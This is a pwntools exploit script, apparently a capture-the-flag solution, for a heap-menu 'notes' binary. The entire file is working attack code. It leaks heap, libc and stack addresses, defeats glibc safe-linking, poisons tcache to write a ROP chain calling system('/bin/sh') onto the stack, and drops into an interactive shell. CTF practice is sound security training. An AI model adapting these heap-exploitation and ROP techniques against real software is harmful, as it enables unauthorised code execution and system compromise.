from pwn import *
import sys

elf = ELF("notes_patched")
libc = ELF("libc.so.6")

io = process(elf.path, timeout=3)
# io = remote("notes_and_problems.zajebistyc.tf", 8002)

context.log_level = 'info'
context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
gdb.attach(io)

def select(idx):
    io.sendlineafter(b'=> ', str(idx).encode())

def create(val, ctx):
    io.sendlineafter(b'value: ', val)
    io.sendafter(b'description: ', ctx)

def create_int(val, ctx):
    select(1)
    create(val, ctx)

def create_double(val, ctx):
    select(3)
    create(val, ctx)

def show(idx):
    io.sendlineafter(b'index: ', str(idx).encode())
    head = b'index: '
    tail = b'\ndescription: '
    val = int(io.recvuntil(tail)[len(head):-len(tail)].decode())
    tail = b'\n1. Create'
    head = b''
    ctx = io.recvuntil(tail)[len(head):-len(tail)]
    return val, ctx

def show_int(idx):
    select(2)
    return show(idx)

def show_double(idx):
    select(4)
    return show(idx)

def free(idx):
    select(5)
    io.sendlineafter(b'index: ', str(idx).encode())

def make_problem(idx, val, ctx):
    select(6)
    io.sendlineafter(b'index: ', str(idx).encode())
    io.sendlineafter(b'value: ', val)
    io.sendafter(b'description: ', ctx)

# heap addr leak
create_int(b'0', b'AAA')
free(0)
create_int(b'+', b'AAA\n')
val, ctx = show_int(0)
heap_addr = val << 12
free(0)

def safe_linking(addr):
    return addr ^ (heap_addr >> 12)

log.info(f'heap addr: {hex(heap_addr)}')

# libc addr leak
create_int(b'0', b'AAA')
create_int(b'0', b'AAA')
free(0)
make_problem(1, str(safe_linking(heap_addr + 0x2f0)).encode(), b'AAA')

create_int(b'0', b'AAA')
create_int(b'0', p64(0) + p64(0x431))
for i in range(11):
    create_double(b'0', b'AAA')
free(0)
create_int(b'0', b'AAA')
val, ctx = show_int(2)
libc.address = val - 0x1f6ce0

log.info(f'libc addr: {hex(libc.address)}')

# stack addr leak
free(5)
free(4)
create_int(b'0', b'AAA')
create_int(b'0', p64(0x0) * 7 + p64(0x61) + p64(safe_linking(libc.sym["environ"])))
create_int(b'0', b'AAA')
create_double(b'0', b'AAA')
create_double(b'+', b'AAA')
val, ctx = show_int(15)
ret_addr = val - 0x130

log.info(f'return addr from loop() @ {hex(ret_addr)}')

# write ROP chain in the stack
free(7)
free(6)
rop_addr = (ret_addr >> 4) << 4
create_int(b'0', p64(0x0) * 3 + p64(0x61) + p64(safe_linking(rop_addr - 0x10)))

p = b''
if ret_addr & 0xf == 8:
    p += p64(0)
p += p64(next(libc.search(asm("pop rdi; ret"), executable=True)))
p += p64(next(libc.search(b"/bin/sh\x00")))
p += p64(next(libc.search(asm("ret"), executable=True)))
p += p64(libc.sym["system"])

create_double(b'0', b'AAA')
create_double(b'0', p)

# exploit!
select(7)

io.interactive()
